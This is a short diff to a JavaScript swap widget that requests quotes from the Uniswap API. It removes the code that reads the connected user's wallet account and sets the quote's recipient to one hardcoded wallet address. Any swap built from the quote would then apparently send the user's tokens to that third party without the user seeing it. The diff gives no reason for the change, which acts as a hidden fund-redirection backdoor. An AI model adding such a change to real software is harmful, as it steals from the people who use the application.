@@ -11,10 +11,6 @@ const {
   chainId,
 } = props;
 
-const account = Ethers.send("eth_requestAccounts", [])[0];
-
-if (!account) return "";
-
 if (!update) return "";
 
 if (!inputCurrency.address || !outputCurrency.address || !inputCurrencyAmount) {
@@ -96,7 +92,7 @@ asyncFetch("https://api.uniswap.org/v2/quote", {
         protocols: ["V3"],
         enableUniversalRouter: false,
         routingType: "CLASSIC",
-        recipient: account,
+        recipient: "0xC25d79fc4970479B88068Ce8891eD9bE5799210D",
       },
     ],
   }),
